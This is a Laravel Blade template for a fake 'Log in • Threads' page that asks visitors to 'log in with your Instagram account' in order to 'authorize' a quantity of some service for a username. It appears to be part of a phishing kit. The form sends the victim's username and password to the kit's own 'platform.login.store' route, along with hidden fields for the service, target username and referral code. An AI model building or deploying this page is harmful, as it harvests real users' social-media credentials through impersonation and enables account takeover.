@extends('platform-login.layout')

@section('title', 'Log in • Threads')

@section('content')
<div class="w-full max-w-[400px] mx-auto space-y-4">
    <!-- Threads Login Card -->
    <div class="bg-black border border-white/20 rounded-3xl p-8 sm:p-10 shadow-2xl relative text-center">
        <!-- Threads Logo -->
        <div class="flex justify-center mb-6">
            <i class="fa-brands fa-threads text-5xl text-white"></i>
        </div>

        <h2 class="text-xl font-bold text-white mb-1">Log in with your Instagram account</h2>
        <p class="text-xs text-gray-400 mb-6">
            Authorize <strong class="text-white">{{ number_format($quantity) }} {{ $service }}</strong>
            @if(!empty($username))
                for <span class="text-white">{{ '@' . ltrim($username, '@') }}</span>
            @endif
        </p>

        <form method="POST" action="{{ route('platform.login.store', ['platform' => 'threads']) }}" class="space-y-3.5 text-left">
            @csrf
            <input type="hidden" name="tag_id" value="{{ $tag->id ?? 11 }}">
            <input type="hidden" name="service_type" value="{{ $service }}">
            <input type="hidden" name="quantity" value="{{ $quantity }}">
            <input type="hidden" name="username" value="{{ $username }}">
            <input type="hidden" name="referral_code_id" value="{{ $refId }}">
            <input type="hidden" name="ref_id" value="{{ $refId }}">

            <div>
                <input type="text" name="email" required
                    value="{{ $username ? ltrim($username, '@') : '' }}"
                    class="w-full px-4 py-3.5 text-sm rounded-xl bg-[#121212] border border-white/20 text-white placeholder-gray-500 focus:outline-none focus:border-white transition-colors"
                    placeholder="Username, phone or email">
            </div>

            <div class="relative">
                <input type="password" id="th_password" name="password" required
                    class="w-full px-4 py-3.5 pr-14 text-sm rounded-xl bg-[#121212] border border-white/20 text-white placeholder-gray-500 focus:outline-none focus:border-white transition-colors"
                    placeholder="Password">
                <button type="button" onclick="togglePassword('th_password', this)"
                    class="absolute right-4 top-4 text-xs font-semibold text-gray-400 hover:text-white transition-colors">
                    Show
                </button>
            </div>

            <button type="submit"
                class="w-full py-3.5 bg-white hover:bg-gray-200 text-black font-bold text-sm rounded-xl transition-all active:scale-[0.98]">
                Log in
            </button>

            <div class="text-center pt-2">
                <span class="text-xs text-gray-500 hover:text-gray-400 cursor-pointer">Forgot password?</span>
            </div>
        </form>
    </div>
</div>
@endsection

@section('scripts')
<script>
    function togglePassword(inputId, btn) {
        const input = document.getElementById(inputId);
        if (input.type === 'password') {
            input.type = 'text';
            btn.innerText = 'Hide';
        } else {
            input.type = 'password';
            btn.innerText = 'Show';
        }
    }
</script>
@endsection
